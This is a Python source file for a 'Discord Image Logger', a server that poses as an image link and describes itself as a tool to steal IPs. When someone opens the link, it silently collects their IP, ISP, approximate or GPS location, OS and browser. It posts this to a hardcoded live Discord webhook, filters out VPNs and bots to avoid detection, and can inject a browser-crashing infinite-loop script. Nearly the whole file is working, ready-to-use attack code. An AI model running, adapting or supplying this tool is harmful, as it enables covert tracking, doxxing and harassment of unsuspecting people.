# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1476034939500626054/fiKt9hHqXUc0kajNtZrF-f5WKGAa1iVdxIq_thDdDq0ygLGN8NF2a1Y_5-ITAGtDAyes",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "normal cool bot", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
